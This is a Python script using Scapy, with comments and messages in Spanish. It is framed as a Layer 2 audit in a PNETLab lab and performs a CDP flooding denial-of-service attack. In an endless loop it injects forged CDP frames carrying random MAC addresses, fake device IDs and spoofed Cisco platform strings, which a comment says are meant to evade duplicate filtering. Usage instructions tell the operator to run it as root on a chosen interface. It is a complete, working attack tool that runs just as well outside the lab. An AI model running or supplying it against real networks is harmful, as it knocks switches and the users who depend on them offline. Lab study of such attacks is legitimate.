#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auditoría de Capa 2: Ataque DoS mediante inundación de vecinos CDP (CDP Flooding)
Entorno de Pruebas: PNETLab / VMware Workstation
VLAN Evaluada: VLAN 66
Interfaz Local Recomendada: e0 o eth0 (Mapeada a e0/3 en el Switch)
"""

import sys
import time
import random
import string
from scapy.all import *

# Validar dependencias del protocolo CDP en Scapy
try:
    load_contrib("cdp")
except:
    print("[-] Error: No se pudieron cargar las extensiones CDP de Scapy.")
    sys.exit(1)

def generar_string_aleatorio(longitud=8):
    """Genera un identificador alfanumérico aleatorio para simular nombres de dispositivos."""
    caracteres = string.ascii_letters + string.digits
    return ''.join(random.choice(caracteres) for _ in range(longitud))

def ejecutar_cdp_flood(interfaz_red):
    print(f"\n[+] Iniciando auditoría de denegación de servicio (CDP Flooding)...")
    print(f"[+] Inyectando tráfico malicioso a través de la interfaz local: {interfaz_red}")
    print("[+] Presiona CTRL+C para detener la tormenta de tramas.\n")
    
    contador = 0
    try:
        while True:
            # 1. Generar variables mutables falsas para evadir filtros de duplicados
            device_id = f"SW-Falso-{generar_string_aleatorio(6)}"
            platform_id = random.choice(["Cisco IP Phone 7940", "Cisco Catalyst 2960", "Cisco Router 2911"])
            software_version = "Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE10.1"
            port_id = f"FastEthernet0/{random.randint(1,48)}"
            
            # 2. Construcción de las capas de control de enlace de datos (Capa 2 LLC/SNAP)
            # CDP utiliza una dirección de destino Multicast indexada por Cisco
            paquete_base = (
                Ether(src=RandMAC(), dst="01:00:0c:cc:cc:cc") /
                LLC(dsap=170, ssap=170, ctrl=3) /
                SNAP(OUI=12, code=8192)
            )
            
            # 3. Ensamblaje del cuerpo de datos del protocolo CDP (Campos TLV)
            paquete_cdp = CDPv2_Header(version=2, ttl=180) / \
                          CDPMsgDeviceID(val=device_id) / \
                          CDPMsgSoftwareVersion(val=software_version) / \
                          CDPMsgPortID(val=port_id) / \
                          CDPMsgPlatform(val=platform_id)
            
            # Paquete final consolidado
            trama_completa = paquete_base / paquete_cdp
            
            # 4. Inyección en la interfaz física de acceso
            sendp(trama_completa, iface=interfaz_red, verbose=False)
            
            contador += 1
            if contador % 500 == 0:
                print(f"[➔] {contador} tramas CDP falsas inyectadas en el switch.")
                
    except KeyboardInterrupt:
        print(f"\n[-] Auditoría finalizada por el operador.")
        print(f"[+] Total de tramas CDP transmitidas: {contador}")
    except PermissionError:
        print("\n[-] Error crítico: Se requieren privilegios de Administrador (root) para inyectar tramas en la Capa 2.")
        print("[-] Reintenta ejecutando: sudo python3 cdp_flooding.py <interfaz>")

if __name__ == "__main__":
    # Validar argumentos de la línea de comandos
    if len(sys.argv) != 2:
        print("[-] Uso incorrecto del script.")
        print("[-] Sintaxis: sudo python3 cdp_flooding.py <interfaz_local>")
        print("[-] Ejemplo:  sudo python3 cdp_flooding.py e0")
        sys.exit(1)
        
    interfaz_objetivo = sys.argv[1]
    ejecutar_cdp_flood(interfaz_objetivo)